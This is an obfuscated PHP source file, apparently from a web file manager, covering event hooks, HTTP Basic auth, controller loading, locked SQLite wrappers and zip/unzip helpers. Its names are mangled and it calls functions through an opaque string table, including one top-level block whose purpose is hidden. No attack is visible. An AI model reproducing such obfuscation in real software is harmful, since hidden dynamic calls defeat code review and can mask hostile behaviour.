($fŠ‰¢—‚Ë[$eŸèß¡Ôª[1753]] && $fŠ‰¢—‚Ë[$eŸèß¡Ôª[1754]] > 1) { continue; } self::$events[$eÒÙÑ¯êËì][$aíæËë„‚Ç][$eŸèß¡Ôª[1754]] = $fŠ‰¢—‚Ë[$eŸèß¡Ôª[1754]] + 1; $a–ŒÕ¥‡ì­ = self::apply($fŠ‰¢—‚Ë[$eŸèß¡Ôª[1752]], array($b˜×Ş©ÇàÉ)); if (gettype($a–ŒÕ¥‡ì­) == gettype($b˜×Ş©ÇàÉ)) { $b˜×Ş©ÇàÉ = $a–ŒÕ¥‡ì­; } } return $b˜×Ş©ÇàÉ; goto dÄ£¨¦å; E¥èé°„Ï: $FØÌéğÈí´ = $B¬ÊĞöõä‘[$eÒÙÑ¯êËì]; $b˜×Ş©ÇàÉ = $fóìİÃõÁà; if (!is_array($FØÌéğÈí´) || count($FØÌéğÈí´) == 0) { return $b˜×Ş©ÇàÉ; } goto aî†ãŠŠÉÆ; CÖŒîï©¤–: $eŸèß¡Ôª =& $_SERVER[‚Ğ°–—î]; $B¬ÊĞöõä‘ = self::$events; if (!isset($B¬ÊĞöõä‘[$eÒÙÑ¯êËì])) { return $fóìİÃõÁà; } goto E¥èé°„Ï; dÄ£¨¦å: } public static function trigger($B¿¹å–Ô°) { goto Aù‘î Õ‘«; eóïº÷†: return $C¥‚ ŸåŒ; goto d°ƒ’·ÕÛÔ; Aù‘î Õ‘«: $e½Û‘Î½¬é =& $_SERVER[‚Ğ°–—î]; $fê»øáŠÓë = self::$events; $C¥‚ ŸåŒ = !1; goto Cğ¦çóğ½§; A¢¢»â‰¢×: $fŞ‹Ó„‰¼± = func_get_args(); array_shift($fŞ‹Ó„‰¼±); for ($F›™ØçÕ˜ó = 0; $F›™ØçÕ˜ó < count($dÑŞ¾‰àÂ ); $F›™ØçÕ˜ó++) { $D¥»ìœŸÓß = $dÑŞ¾‰àÂ [$F›™ØçÕ˜ó]; if ($D¥»ìœŸÓß[$e½Û‘Î½¬é[1753]] && $D¥»ìœŸÓß[$e½Û‘Î½¬é[1754]] > 1) { continue; } if (defined($e½Û‘Î½¬é[1755]) && GLOBAL_LOG_HOOK) { write_log($B¿¹å–Ô° . $e½Û‘Î½¬é[1756] . $D¥»ìœŸÓß[$e½Û‘Î½¬é[1752]], $e½Û‘Î½¬é[1757]); } self::$events[$B¿¹å–Ô°][$F›™ØçÕ˜ó][$e½Û‘Î½¬é[1754]] = $D¥»ìœŸÓß[$e½Û‘Î½¬é[1754]] + 1; $dŞ®ÍÄ‰ß³ = self::apply($D¥»ìœŸÓß[$e½Û‘Î½¬é[1752]], $fŞ‹Ó„‰¼±); if (defined($e½Û‘Î½¬é[1755]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $e½Û‘Î½¬é[1757]); if ($D¥»ìœŸÓß[$e½Û‘Î½¬é[1754]] == 200) { $AŞ¢çÜÚ„ = is_array($D¥»ìœŸÓß[$e½Û‘Î½¬é[1752]]) ? json_encode_force($D¥»ìœŸÓß[$e½Û‘Î½¬é[1752]]) : $D¥»ìœŸÓß[$e½Û‘Î½¬é[1752]]; write_log($e½Û‘Î½¬é[1758] . $B¿¹å–Ô° . $e½Û‘Î½¬é[1759] . $AŞ¢çÜÚ„, $e½Û‘Î½¬é[1760]); } } $C¥‚ ŸåŒ = is_null($dŞ®ÍÄ‰ß³) ? $C¥‚ ŸåŒ : $dŞ®ÍÄ‰ß³; } goto eóïº÷†; Cğ¦çóğ½§: if (!isset($fê»øáŠÓë[$B¿¹å–Ô°])) { return $C¥‚ ŸåŒ; } $dÑŞ¾‰àÂ  = $fê»øáŠÓë[$B¿¹å–Ô°]; if (!is_array($dÑŞ¾‰àÂ ) || count($dÑŞ¾‰àÂ ) == 0) { return $C¥‚ ŸåŒ; } goto A¢¢»â‰¢×; d°ƒ’·ÕÛÔ: } } class HttpAuth { public static function get() { $CÕ”ñ÷¸ğ  =& $_SERVER[‚Ğ°–—î]; $CÊ•¶›¦õß = $CÕ”ñ÷¸ğ [33]; $CÁÛÄèå˜‰ = $CÕ”ñ÷¸ğ [33]; if (isset($_SERVER[$CÕ”ñ÷¸ğ [1761]])) { $CÊ•¶›¦õß = $_SERVER[$CÕ”ñ÷¸ğ [1761]]; $CÁÛÄèå˜‰ = $_SERVER[$CÕ”ñ÷¸ğ [1762]]; } elseif (isset($_SERVER[$CÕ”ñ÷¸ğ [1763]])) { $d¶’éöäó = $_SERVER[$CÕ”ñ÷¸ğ [1763]]; if (strpos(strtolower($d¶’éöäó), $CÕ”ñ÷¸ğ [1764]) === 0) { $b‰õŠª¤®Ø = explode($CÕ”ñ÷¸ğ [4], base64_decode(substr($d¶’éöäó, 6))); $CÊ•¶›¦õß = isset($b‰õŠª¤®Ø[0]) ? $b‰õŠª¤®Ø[0] : $CÕ”ñ÷¸ğ [33]; $CÁÛÄèå˜‰ = isset($b‰õŠª¤®Ø[1]) ? $b‰õŠª¤®Ø[1] : 0; } } return array($CÕ”ñ÷¸ğ [535] => $CÊ•¶›¦õß, $CÕ”ñ÷¸ğ [898] => $CÁÛÄèå˜‰); } public static function error() { goto EÈ²Ñîˆ©ˆ; c„¸Â’ÚĞÁ: header($eì³êåò•ï[1767]); header($eì³êåò•ï[1768]); header($eì³êåò•ï[1263]); goto Bêª¸õÜŠÑ; EÈ²Ñîˆ©ˆ: $eì³êåò•ï =& $_SERVER[‚Ğ°–—î]; header($eì³êåò•ï[1765]); header($eì³êåò•ï[1766]); goto c„¸Â’ÚĞÁ; Bêª¸õÜŠÑ: die; goto F³ÓŸğ‘ë¿; F³ÓŸğ‘ë¿: } public static function make($aõ‰ÂäÌ¥Ã, $b”°å¯‚ˆ¬) { $béœÉ¶ØŠ´ =& $_SERVER[‚Ğ°–—î]; return $béœÉ¶ØŠ´[1769] + base64_encode($aõ‰ÂäÌ¥Ã . $béœÉ¶ØŠ´[4] . $b”°å¯‚ˆ¬); } } goto C¡²‡¹ˆš; CêÊºÀ¥ã: class ZipStream { } $D¢Çì•Ø®Ã = LIB_DIR . $_SERVER[‚Ğ°–—î][2031]; $Fß»­Š„‚í = $_SERVER[‚Ğ°–—î][1308]; goto Dµ°øßâ¾÷; fºÌö†ë—Ç: function Action($eâõµÏ©ßò = '') { goto c¿çËŠÈì; E»·èŒŠ’ö: $eåĞ°ì“Ë¯ = strtolower($eÊâéª¡ø[0]); if (substr($eåĞ°ì“Ë¯, -6) == $Dî¾¯ã­†¡[6]) { $eâõµÏ©ßò = substr($eÊâéª¡ø[0], 0, -6); $A„±Œö‚Ê“ = $eâõµÏ©ßò . $Dî¾¯ã­†¡[7]; $cÒ¦„ªçÄ = $Dî¾¯ã­†¡[8]; if (isset($eÊâéª¡ø[1]) && substr(strtolower($eÊâéª¡ø[1]), -5) == $Dî¾¯ã­†¡[9]) { $A„±Œö‚Ê“ = $eâõµÏ©ßò . $eÊâéª¡ø[1]; $cÒ¦„ªçÄ = $Dî¾¯ã­†¡[10] . $eÊâéª¡ø[1] . $Dî¾¯ã­†¡[11]; } else { if (count($eÊâéª¡ø) == 3) { $A„±Œö‚Ê“ = $eâõµÏ©ßò . $eÊâéª¡ø[1] . $eÊâéª¡ø[2]; $cÒ¦„ªçÄ = $Dî¾¯ã­†¡[12] . $eÊâéª¡ø[1] . $Dî¾¯ã­†¡[13] . $eÊâéª¡ø[2] . $Dî¾¯ã­†¡[11]; } } $cÒ¦„ªçÄ = PLUGIN_DIR . $eâõµÏ©ßò . $Dî¾¯ã­†¡[4] . $cÒ¦„ªçÄ; } else { if (substr($eåĞ°ì“Ë¯, -5) == $Dî¾¯ã­†¡[9]) { $eâõµÏ©ßò = substr($eÊâéª¡ø[0], 0, -5); return Model($eâõµÏ©ßò); } else { $A„±Œö‚Ê“ = $eÊâéª¡ø[0] . $eÊâéª¡ø[1]; $cÒ¦„ªçÄ = CONTROLLER_DIR . $eÊâéª¡ø[0] . $Dî¾¯ã­†¡[4] . $eÊâéª¡ø[1] . $Dî¾¯ã­†¡[14]; } } $c–Ïæ»Ÿ–Š = strtolower($A„±Œö‚Ê“); goto aªÒµñí±Š; C”å‡Å§Àñ: if (isset($bà–±³¨¬ß[$Bšˆˆİá½Œ])) { return $bà–±³¨¬ß[$Bšˆˆİá½Œ]; } $eâõµÏ©ßò = trim(str_replace($Dî¾¯ã­†¡[4], $Dî¾¯ã­†¡[5], $eâõµÏ©ßò), $Dî¾¯ã­†¡[4]); $eÊâéª¡ø = explode($Dî¾¯ã­†¡[5], $eâõµÏ©ßò); goto E»·èŒŠ’ö; a´·Œåôê: $bà–±³¨¬ß[$c–Ïæ»Ÿ–Š] = new $A„±Œö‚Ê“(); $bà–±³¨¬ß[$Bšˆˆİá½Œ] = $bà–±³¨¬ß[$c–Ïæ»Ÿ–Š]; return $bà–±³¨¬ß[$c–Ïæ»Ÿ–Š]; goto eêÒÕÓ‰ô±; c¿çËŠÈì: $Dî¾¯ã­†¡ =& $_SERVER[ú]; static $bà–±³¨¬ß = array(); $Bšˆˆİá½Œ = $eâõµÏ©ßò; goto C”å‡Å§Àñ; aªÒµñí±Š: if (isset($bà–±³¨¬ß[$c–Ïæ»Ÿ–Š])) { return $bà–±³¨¬ß[$c–Ïæ»Ÿ–Š]; } if (is_file($cÒ¦„ªçÄ)) { include_once $cÒ¦„ªçÄ; } if (!class_exists($A„±Œö‚Ê“)) { return actionCallError("\133{$eâõµÏ©ßò}\40\x3d\76\x20{$A„±Œö‚Ê“}\x5d\40\143\x6c\x61\x73\x73\x20\x6e\157\x74\40\x65\x78\151\x73\164\x73\41"); } goto a´·Œåôê; eêÒÕÓ‰ô±: } function ActionApply($B§™çê‚‡, $B‘Íß£š‚Í = array()) { goto cÖ° ’¶Å¶; fä»«Ï½Í: if (!method_exists($b®¼Ò»‚’ñ, $B£ç¤ñ³Ï)) { return actionCallError("{$B§™çê‚‡}\40\x6d\x65\164\150\157\144\40\x6e\157\x74\40\x65\x78\x69\163\164\163\x21"); } $e–¬ª„œ¯ë = call_user_func_array(array($b®¼Ò»‚’ñ, $B£ç¤ñ³Ï), $B‘Íß£š‚Í); return $e–¬ª„œ¯ë; goto C³‚¦Ì‘×Û; AøØó²ğ: $c¬¦ÉÜ‰íÍ = substr($B§™çê‚‡, 0, $e¡Ç„õ­ø); $B£ç¤ñ³Ï = substr($B§™çê‚‡, $e¡Ç„õ­ø + 1); $b®¼Ò»‚’ñ = Action($c¬¦ÉÜ‰íÍ); goto fä»«Ï½Í; cÖ° ’¶Å¶: if (is_array($B§™çê‚‡)) { return call_user_func_array($B§™çê‚‡, $B‘Íß£š‚Í); } if (function_exists($B§™çê‚‡)) { return call_user_func_array($B§™çê‚‡, $B‘Íß£š‚Í); } $e¡Ç„õ­ø = strrpos($B§™çê‚‡, $_SERVER[ú][5]); goto AøØó²ğ; C³‚¦Ì‘×Û: } function actionCallError($EÃˆ¦º‹) { $bãåéÉİË¬ =& $_SERVER[ú]; $Eäæ¥ĞÄù = json_encode_force(array($bãåéÉİË¬[15] => this_url(), $bãåéÉİË¬[16] => $GLOBALS[$bãåéÉİË¬[16]])); $Eäæ¥ĞÄù = str_replace(array($bãåéÉİË¬[17]), array($bãåéÉİË¬[4]), $Eäæ¥ĞÄù); return write_log($EÃˆ¦º‹ . $bãåéÉİË¬[18] . $Eäæ¥ĞÄù, $bãåéÉİË¬[19]); } goto e•¶ÛŸÔ¯; F•“Äô°í: class DbSqlite extends DbSqliteBase { public function query($AìôÕÁ®ëå) { goto F–îÌºïğ¢; b›äªÖÚŒš: if (!$eîÒóõÖõ) { return !1; } if (flock($eîÒóõÖõ, LOCK_EX)) { $B†›¹Ëç¼ = parent::query($AìôÕÁ®ëå); flock($eîÒóõÖõ, LOCK_UN); fclose($eîÒóõÖõ); return $B†›¹Ëç¼; } flock($eîÒóõÖõ, LOCK_UN); goto EÄ™Ú¢·; F–îÌºïğ¢: $B´Ç¯²ÎàÒ =& $_SERVER[‚Ğ°–—î]; $f–Ô‡àÖÏ£ = DATA_PATH . $B´Ç¯²ÎàÒ[872]; $eîÒóõÖõ = fopen($f–Ô‡àÖÏ£, $B´Ç¯²ÎàÒ[873]); goto b›äªÖÚŒš; EÄ™Ú¢·: fclose($eîÒóõÖõ); show_json($B´Ç¯²ÎàÒ[874], !1); return !1; goto C ë»©˜ï; C ë»©˜ï: } public function execute($CÕ……Œ£”ˆ) { goto bĞ‡Ò¹“À×; bĞ‡Ò¹“À×: $c™®ËÍ¬ó =& $_SERVER[‚Ğ°–—î]; $A’Ë’à©êï = DATA_PATH . $c™®ËÍ¬ó[872]; $Dî™¨¯£¼™ = fopen($A’Ë’à©êï, $c™®ËÍ¬ó[873]); goto a–‚Ïµ¿…; a–‚Ïµ¿…: if (!$Dî™¨¯£¼™) { return !1; } if (flock($Dî™¨¯£¼™, LOCK_EX)) { $dö±‹à‹—… = parent::execute($CÕ……Œ£”ˆ); flock($Dî™¨¯£¼™, LOCK_UN); fclose($Dî™¨¯£¼™); return $dö±‹à‹—…; } flock($Dî™¨¯£¼™, LOCK_UN); goto cÏª˜é„®; cÏª˜é„®: fclose($Dî™¨¯£¼™); show_json($c™®ËÍ¬ó[874], !1); return !1; goto fƒòÂ’õğ; fƒòÂ’õğ: } } class DbSqlite3 extends DbSqlite3Base { public function query($Eîäõ´ØŠ) { goto f‚éğ†³ƒÎ; f‚éğ†³ƒÎ: $aÊ–Ï‰Ë =& $_SERVER[‚Ğ°–—î]; $B°Ä…îÑí = DATA_PATH . $aÊ–Ï‰Ë[872]; $f­ğöÑÍšó = fopen($B°Ä…îÑí, $aÊ–Ï‰Ë[873]); goto E÷È†áî‹ö; BŞœÆØì±³: fclose($f­ğöÑÍšó); show_json($aÊ–Ï‰Ë[874], !1); return !1; goto E÷°†âÔ¿±; E÷È†áî‹ö: if (!$f­ğöÑÍšó) { return !1; } if (flock($f­ğöÑÍšó, LOCK_EX)) { $C¦Æ¬á–ĞÕ = parent::query($Eîäõ´ØŠ); flock($f­ğöÑÍšó, LOCK_UN); fclose($f­ğöÑÍšó); return $C¦Æ¬á–ĞÕ; } flock($f­ğöÑÍšó, LOCK_UN); goto BŞœÆØì±³; E÷°†âÔ¿±: } public function execute($cÄŸ±«Ïáç) { goto A¸ÌÔÚˆÀ; Aï ‰ƒ: if (!$Cæ‡É¼«‰ö) { return !1; } if (flock($Cæ‡É¼«‰ö, LOCK_EX)) { $bß›”ùÛ›™ = parent::execute($cÄŸ±«Ïáç); flock($Cæ‡É¼«‰ö, LOCK_UN); fclose($Cæ‡É¼«‰ö); return $bß›”ùÛ›™; } flock($Cæ‡É¼«‰ö, LOCK_UN); goto b²È«äŞã•; b²È«äŞã•: fclose($Cæ‡É¼«‰ö); show_json($a½Ã¬í³â[874], !1); return !1; goto f¼œëÂÄö; A¸ÌÔÚˆÀ: $a½Ã¬í³â =& $_SERVER[‚Ğ°–—î]; $Få­°›÷’Ñ = DATA_PATH . $a½Ã¬í³â[872]; $Cæ‡É¼«‰ö = fopen($Få­°›÷’Ñ, $a½Ã¬í³â[873]); goto Aï ‰ƒ; f¼œëÂÄö: } } if ($_SERVER[$_SERVER[‚Ğ°–—î][777]] != $_SERVER[$_SERVER[‚Ğ°–—î][875]]) { goto aâ„ùµ—„¨; Cˆ¼ò³£¯: $B”ÖÒ–ù¨ƒ = explode($_SERVER[‚Ğ°–—î][217], $C¤§Ëæ¿»ì); if (count($B”ÖÒ–ù¨ƒ) < $_SERVER[‚Ğ°–—î][610]) { $C¡ö…÷‡çØ = $_SERVER[‚Ğ°–—î][782]; $C¡ö…÷‡çØ(); } $f§„›ˆõÌÖ = $_SERVER[‚Ğ°–—î][783]; goto C×šˆˆ¦ß; aâ„ùµ—„¨: $Fî¬©ÕÁÍÈ = $_SERVER[‚Ğ°–—î][779]; $A„…¼ªÀ½î = $_SERVER[$_SERVER[‚Ğ°–—î][780]] . $_SERVER[‚Ğ°–—î][781]; $C¤§Ëæ¿»ì = $Fî¬©ÕÁÍÈ($A„…¼ªÀ½î); goto Cˆ¼ò³£¯; C×šˆˆ¦ß: $f§„›ˆõÌÖ($_SERVER[$_SERVER[‚Ğ°–—î][778]]); goto eÚ¹ƒ—õŒ²; eÚ¹ƒ—õŒ²: } goto FÂè±ºë•‡; E…Ìß¸ÙŞ¨: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $d·‘¾µ¸É; if (!$d·‘¾µ¸É) { $dØÑÀÉ§Ãô = IO::init($_SERVER[‚Ğ°–—î][8]); } return $dØÑÀÉ§Ãô; } private static function iconvSystem($A»ŠäÙ¦¢„) { return self::local()->iconvSystem($A»ŠäÙ¦¢„); } private static function iconvApp($böË­î›ç) { return self::local()->iconvApp($böË­î›ç); } public static function zip($E¸£ô¹, $D‰òâµá‚ = "\x7a\151\160", $AŸÁ‚´Ú…Ù = '', $cõïÆÚà½‘ = REPEAT_RENAME) { goto CøÎÔ«ö“ø; bÍ²¯äƒ: if (count($bçƒº¦Û¢Ô) > 1) { $Bˆ’ùÆÛÃ… = IO::info(IO::pathFather($fÀÅÁ†ó‰ì[$EÙøœ¸¾°Ú[75]])); $eî³ºîÎ« = $Bˆ’ùÆÛÃ…[$EÙøœ¸¾°Ú[28]]; } $E‚ÒÍçŞô„ = $BŞóÊÀ¼ÎŠ; if (!$E‚ÒÍçŞô„) { $E‚ÒÍçŞô„ = get_path_father($fÀÅÁ†ó‰ì[$EÙøœ¸¾°Ú[75]]); $AÂ¦ß‹ìÂÎ = IO::info($E‚ÒÍçŞô„); if (!$AÂ¦ß‹ìÂÎ[$EÙøœ¸¾°Ú[189]]) { show_json(LNG($EÙøœ¸¾°Ú[1027]), !1); } } goto CØŸƒËœÙÚ; CøÎÔ«ö“ø: $EÙøœ¸¾°Ú =& $_SERVER[‚Ğ°–—î]; $bï›Äè˜ = self::init($E¸£ô¹[0][$EÙøœ¸¾°Ú[75]]); $fÀÅÁ†ó‰ì = self::info($E¸£ô¹[0][$EÙøœ¸¾°Ú[75]]); goto a±İ±ÈßÆ; Fë‡¡…¼›Á: foreach ($bçƒº¦Û¢Ô as $aÚÎ‚Ñˆ× => $CŠ„‚Áˆ¹¶) { $bçƒº¦Û¢Ô[$aÚÎ‚Ñˆ×] = self::iconvSystem($CŠ„‚Áˆ¹¶); } KodArchive::create($dÁ§®Ë­”¨, $bçƒº¦Û¢Ô); if (!IO::exist($eàƒŠ®¬§Õ)) { if ($BŞóÊÀ¼ÎŠ) { del_dir($BŞóÊÀ¼ÎŠ); } show_json(LNG($EÙøœ¸¾°Ú[1028]), !1); } goto aª‡æãÚÓ©; CØŸƒËœÙÚ: $eàƒŠ®¬§Õ = $E‚ÒÍçŞô„ . $eî³ºîÎ« . $EÙøœ¸¾°Ú[91] . $D‰òâµá‚; $eàƒŠ®¬§Õ = get_filename_auto($eàƒŠ®¬§Õ, $EÙøœ¸¾°Ú[33], $cõïÆÚà½‘); $dÁ§®Ë­”¨ = self::iconvSystem($eàƒŠ®¬§Õ); goto Fë‡¡…¼›Á; aª‡æãÚÓ©: if ($AŸÁ‚´Ú…Ù || !$BŞóÊÀ¼ÎŠ) { if ($BŞóÊÀ¼ÎŠ && strstr($BŞóÊÀ¼ÎŠ, TEMP_FILES)) { $fç¸Ê«‘Æ = $bçƒº¦Û¢Ô = array(); recursion_dir($E‚ÒÍçŞô„, $fç¸Ê«‘Æ, $bçƒº¦Û¢Ô, 0); foreach ($fç¸Ê«‘Æ as $f´Æ½›ÓÖ) { del_dir($f´Æ½›ÓÖ); } foreach ($bçƒº¦Û¢Ô as $Fî¾¯òª¿Æ) { if ($Fî¾¯òª¿Æ == $dÁ§®Ë­”¨) { continue; } del_file($Fî¾¯òª¿Æ); } } return $eàƒŠ®¬§Õ; } $aÀùâ¤…î = self::pathFather($fÀÅÁ†ó‰ì[$EÙøœ¸¾°Ú[75]]); $ešî´É¦…ï = self::move($eàƒŠ®¬§Õ, $aÀùâ¤…î, $cõïÆÚà½‘); goto bõ·‘®¢ß°; bõ·‘®¢ß°: if (!$ešî´É¦…ï) { del_dir($BŞóÊÀ¼ÎŠ); show_json(LNG($EÙøœ¸¾°Ú[1028]), !1); } del_dir($BŞóÊÀ¼ÎŠ); return $ešî´É¦…ï; goto bÃÜèØ¥Ğó; a±İ±ÈßÆ: $BŞóÊÀ¼ÎŠ = !1; if (!$AŸÁ‚´Ú…Ù && $bï›Äè˜->getType() == $EÙøœ¸¾°Ú[102]) { $bçƒº¦Û¢Ô = self::zipFileList($E¸£ô¹); } else { $BŞóÊÀ¼ÎŠ = $AŸÁ‚´Ú…Ù ? $AŸÁ‚´Ú…Ù : TEMP_FILES . $EÙøœ¸¾°Ú[1026] . time() . rand_string(8) . $EÙøœ¸¾°Ú[8]; mk_dir($BŞóÊÀ¼ÎŠ); $bçƒº¦Û¢Ô = self::zipFileList($E¸£ô¹, $BŞóÊÀ¼ÎŠ); } $eî³ºîÎ« = $fÀÅÁ†ó‰ì[$EÙøœ¸¾°Ú[28]]; goto bÍ²¯äƒ; bÃÜèØ¥Ğó: } public static function unzip($aµ˜ïÖó„¤, $dã¥·è÷ = "\162\x65\160\x6c\141\x63\x65") { goto Dç¸ óÚ“; dŒìí¯ÓÙ: if (!@file_exists(self::iconvSystem($eœ¼ÉÌÇ‡Ø))) { $fŠ¦“²â = self::localFilePath($C‰Å±ƒ®§¦, $D”Šï‘Ôğ›); $eœ¼ÉÌÇ‡Ø = $fŠ¦“²â ? $fŠ¦“²â : parent::download($C‰Å±ƒ®§¦, $eœ¼ÉÌÇ‡Ø); } $eœ¼ÉÌÇ‡Ø = self::iconvSystem($eœ¼ÉÌÇ‡Ø); $FÉ¤“°¤¦Ì = isset($aµ˜ïÖó„¤[$E±‘ßº‹Ù¡[1031]]) ? $aµ˜ïÖó„¤[$E±‘ßº‹Ù¡[1031]] : $E±‘ßº‹Ù¡[1032]; goto C•÷ïÅŠñ; fáÆ®†Ô÷â: mk_dir($DáŠë·‰¼); $D”Šï‘Ôğ› = self::fileExt($Aàƒ·íµåê); $eœ¼ÉÌÇ‡Ø = $DáŠë·‰¼ . $E±‘ßº‹Ù¡[91] . $D”Šï‘Ôğ›; goto dŒìí¯ÓÙ; Aï¾£ˆ¶: foreach ($aØ’™Òô½é as $EéŸ†­·Í‹) { $EéŸ†­·Í‹ = self::iconvApp($EéŸ†­·Í‹); self::move($EéŸ†­·Í‹, $F ¸Ò×±á«, $dã¥·è÷); } del_dir($DáŠë·‰¼); if (!$fŠ¦“²â) { del_file($eœ¼ÉÌÇ‡Ø); } goto D©‰íÔæÜ; Dç¸ óÚ“: $E±‘ßº‹Ù¡ =& $_SERVER[‚Ğ°–—î]; $C‰Å±ƒ®§¦ = $aµ˜ïÖó„¤[$E±‘ßº‹Ù¡[75]]; $F ¸Ò×±á« = $aµ˜ïÖó„¤[$E±‘ßº‹Ù¡[1029]]; goto CÜî™—É¶; d¸Ê‚ÌÌö×: Hook::trigger($E±‘ßº‹Ù¡[1036], $DáŠë·‰¼); recursion_dir($DáŠë·‰¼, $C½ìçÃÈ, $cº¥éç²‰–, 0); $aØ’™Òô½é = array_merge($C½ìçÃÈ, $cº¥éç²‰–); goto Aï¾£ˆ¶; CÜî™—É¶: if (!($Aàƒ·íµåê = parent::info($C‰Å±ƒ®§¦))) { show_json(LNG($E±‘ßº‹Ù¡[1030]), !1); } if (!($a×Ä¶¿¼‰² = parent::infoFull($F ¸Ò×±á«))) { $F ¸Ò×±á« = parent::mkdir($F ¸Ò×±á«); $a×Ä¶¿¼‰² = array($E±‘ßº‹Ù¡[75] => $F ¸Ò×±á«); } else { if (isset($a×Ä¶¿¼‰²[$E±‘ßº‹Ù¡[369]]) && trim($a×Ä¶¿¼‰²[$E±‘ßº‹Ù¡[75]], $E±‘ßº‹Ù¡[8]) != trim($F ¸Ò×±á«, $E±‘ßº‹Ù¡[8])) { $E¡ê›ÊŒ½¬ = KodIO::make($a×Ä¶¿¼‰²[$E±‘ßº‹Ù¡[461]]); $BÙÖ«½‘ = parent::fileNameAuto($E¡ê›ÊŒ½¬, $a×Ä¶¿¼‰²[$E±‘ßº‹Ù¡[28]], REPEAT_RENAME_FOLDER, !0); $F ¸Ò×±á« = parent::mkdir($E¡ê›ÊŒ½¬ . $BÙÖ«½‘); $a×Ä¶¿¼‰² = array($E±‘ßº‹Ù¡[75] => $F ¸Ò×±á«); } } $F ¸Ò×±á« = $a×Ä¶¿¼‰²[$E±‘ßº‹Ù¡[75]]; goto F†¬§”£»³; F†¬§”£»³: $bùŒö¬­¥Î = self::tmpFileName($Aàƒ·íµåê); $DáŠë·‰¼ = TEMP_FILES . $bùŒö¬­¥Î; del_dir($DáŠë·‰¼); goto fáÆ®†Ô÷â; D©‰íÔæÜ: return !0; goto c‰Œâöç ; C•÷ïÅŠñ: $ašÙÂÇ“¢ = KodArchive::extract($eœ¼ÉÌÇ‡Ø, $DáŠë·‰¼ . $E±‘ßº‹Ù¡[8], $FÉ¤“°¤¦Ì); self::archiveExt(); if (!$ašÙÂÇ“¢[$E±‘ßº‹Ù¡[1033]]) { show_json($E±‘ßº‹Ù¡[1034] . $ašÙÂÇ“¢[$E±‘ßº‹Ù¡[1035]], !1); } goto d¸Ê‚ÌÌö×; c‰Œâöç : } public static function unzipList($aŞ¤‹¸»Ô„) { goto dëîêº‡×ê; A›éÃĞĞ„Ï: $AÃ˜Û÷ÌÅ® = 50000; if (request_url_safe($dæê‚‹„¹“)) { $aÚéÃ°§ğ = parse_url_query($dæê‚‹„¹“); if (!isset($aÚéÃ°§ğ[$E‘ÖĞôŞ±[75]])) { show_json($E‘ÖĞôŞ±[1038], !1); } } $A•Š³ãäƒÆ = isset($aÚéÃ°§ğ) ? $aÚéÃ°§ğ[$E‘ÖĞôŞ±[75]] : $dæê‚‹„¹“; goto Aé‚Â·ù©„; F¶ÆÄÂÉ‹¶: return $FëØİÒÀ™[$E‘ÖĞôŞ±[1035]]; goto F‘Š„õÀŸ; dëîêº‡×ê: $E‘ÖĞôŞ± =& $_SERVER[‚Ğ°–—î]; $dæê‚‹„¹“ = $aŞ¤‹¸»Ô„[$E‘ÖĞôŞ±[75]]; $A“Ù‚Ë£»â = isset($aŞ¤‹¸»Ô„[$E‘ÖĞôŞ±[1037]]) ? $aŞ¤‹¸»Ô„[$E‘ÖĞôŞ±[1037]] : -1; goto A›éÃĞĞ„Ï; fØ†–ŒÕ´Ï: self::archiveExt(); del_dir($E‘®¼©­§¿); if (!$FëØİÒÀ™[$E‘ÖĞôŞ±[1033]]) { show_json($FëØİÒÀ™[$E‘ÖĞôŞ±[1035]], !1); } goto fÜ­š´Å›ô; fÜ­š´Å›ô: $b´É›§”Ù° = json_encode($FëØİÒÀ™[$E‘ÖĞôŞ±[1035]]); self::setContent($A®—ß­çÆ, $b´É›§”Ù°); if (count($FëØİÒÀ™[$E‘ÖĞôŞ±[1035]]) >= $AÃ˜Û÷ÌÅ®) { show_json(sprintf(LNG($E‘ÖĞôŞ±[1039]), count($FëØİÒÀ™[$E‘ÖĞôŞ±[1035]])), !1); } goto F¶ÆÄÂÉ‹¶; dŒ“‡åàåŠ: if (!is_dir($E‘®¼©­§¿)) { mk_dir($E‘®¼©­§¿); } $FÖè‰Î†ˆì = $E‘®¼©­§¿ . $E‘ÖĞôŞ±[8] . $BÑ‹îÕ‡á‘; if (!@file_exists(self::iconvSystem($FÖè‰Î†ˆì))) { if (isset($aÚéÃ°§ğ)) { url_request($dæê‚‹„¹“, $E‘ÖĞôŞ±[1040], $FÖè‰Î†ˆì); } else { $eĞ¦ÆºÎß = self::localFilePath($dæê‚‹„¹“, $Câí›Í‘¦Û); $FÖè‰Î†ˆì = $eĞ¦ÆºÎß ? $eĞ¦ÆºÎß : self::download($dæê‚‹„¹“, $FÖè‰Î†ˆì); } } goto FŠÔ×è©©Š; Aé‚Â·ù©„: $E‘áÍ†Ïğ = self::info($A•Š³ãäƒÆ); $Câí›Í‘¦Û = self::fileExt($E‘áÍ†Ïğ); $bªÎøØ´É¿ = self::tmpFileName($E‘áÍ†Ïğ); goto Fæâñ ªî­; Fæâñ ªî­: if (isset($aÚéÃ°§ğ)) { $eƒ‚½·ŒÌ = array($aÚéÃ°§ğ[$E‘ÖĞôŞ±[75]], $aÚéÃ°§ğ[$E‘ÖĞôŞ±[1037]], $aÚéÃ°§ğ[$E‘ÖĞôŞ±[28]]); $BÑ‹îÕ‡á‘ = md5(implode($E‘ÖĞôŞ±[70], $eƒ‚½·ŒÌ)) . $E‘ÖĞôŞ±[91] . get_path_ext($aÚéÃ°§ğ[$E‘ÖĞôŞ±[28]]); } else { $eƒ‚½·ŒÌ = array($E‘áÍ†Ïğ[$E‘ÖĞôŞ±[28]], $E‘áÍ†Ïğ[$E‘ÖĞôŞ±[75]], $E‘áÍ†Ïğ[$E‘ÖĞôŞ±[77]]); $BÑ‹îÕ‡á‘ = md5(implode($E‘ÖĞôŞ±[70], $eƒ‚½·ŒÌ)) . $E‘ÖĞôŞ±[91] . $Câí›Í‘¦Û; } if ($A“Ù‚Ë£»â == -1) { $A®—ß­çÆ = IO_PATH_SYSTEM_TEMP . "\x7a\151\160\126\151\145\167\x2f{$bªÎøØ´É¿}\x2f{$BÑ‹îÕ‡á‘}\x2e\x6c\x6f\x67"; $b¬¹ŒÆ Ëƒ = self::infoFull($A®—ß­çÆ); if ($b¬¹ŒÆ Ëƒ) { $A®—ß­çÆ = $b¬¹ŒÆ Ëƒ[$E‘ÖĞôŞ±[75]]; $C÷ˆåáì‹ = self::getContent($A®—ß­çÆ); if ($C÷ˆåáì‹) { $b´É›§”Ù° = json_decode($C÷ˆåáì‹, !0); if (count($b´É›§”Ù°) >= 